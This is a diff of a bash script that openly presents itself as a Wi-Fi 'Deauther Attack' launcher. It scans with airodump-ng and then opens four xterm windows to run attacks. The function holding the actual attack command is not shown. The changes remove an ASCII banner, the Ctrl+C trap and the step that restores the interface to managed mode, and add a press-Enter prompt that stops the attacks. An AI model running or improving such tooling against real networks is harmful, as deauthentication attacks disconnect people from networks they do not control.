@@ -1,34 +1,15 @@
 #!/bin/bash
 
-# Replace with your wireless interface
+#REPLACE WITH YOUR WIRELESS INTERFACE
 IFACE="wlp3s0"
 
 cleanup() {
-
-GREEN='\033[1;32m'
-RESET='\033[0m'
-
-echo -e "${GREEN}"
-echo "        (\_/)"
-echo "        ( •_•)     [Kick Their Ass Out...]"
-echo "       / >💻      "
-echo "     //|_|\\\\     "
-echo "    ( @Limmmw )"
-echo "     \_______/ "
-echo "    | Terminal |"
-echo "    |   Mode   |"
-echo "   /___________\\"
-echo ""
-echo "🐰: \"I'm in.\""
-echo -e "${RESET}"
-
-    echo -e "\n[!] Ctrl+C detected. Killing Deauther Attacks..."
+    echo -e "\n[!] The Attack has been stopped..."
     for pid in "${XTERM_PIDS[@]}"; do
         kill "$pid" 2>/dev/null
     done
     exit 1
 }
-trap cleanup SIGINT
 
 GREEN='\033[1;32m'
 RESET='\033[0m'
@@ -49,8 +30,7 @@ echo "🐰: \"I'm in.\""
 echo -e "${RESET}"
 
 echo "[*] Activating Scanning mode..."
-
-echo "[*] Running airodump-ng (Press Ctrl+C when target is found)..."
+echo "[*] Running airodump-ng (Press CTRL+C if target is detected)..."
 sleep 2
 sudo airodump-ng $IFACE
 
@@ -86,29 +66,12 @@ launch_xterm_at() {
 XTERM_PIDS=()
 echo "[*] Launching Deauther Attack..."
 
-# Top-left
-launch_xterm_at "80x24+0+0"
-
-# Top-right
-launch_xterm_at "80x24-0+0"
-
-# Bottom-left
-launch_xterm_at "80x24+0-0"
-
-# Bottom-right
+launch_xterm_at "80x24+0+0"; sleep 0.5
+launch_xterm_at "80x24+0-0"; sleep 0.5
+launch_xterm_at "80x24-0+0"; sleep 0.5
 launch_xterm_at "80x24-0-0"
 
-wait
-
 echo
-read -p "[?] Do you want to return the interface to normal mode? (y/n): " Answer
+read -p "[!] Press Enter to stop the Attacks..." _
 
-if [[ "$Answer" == "y" || "$Answer" == "Y" ]]; then
-    echo "[*] Restoring managed mode..."
-    sudo ip link set $IFACE down
-    sudo iw dev $IFACE set type managed
-    sudo ip link set $IFACE up
-    echo "[✔] Interface is back in managed mode."
-else
-    echo "[!] Interface remains in monitor mode."
-fi
+cleanup
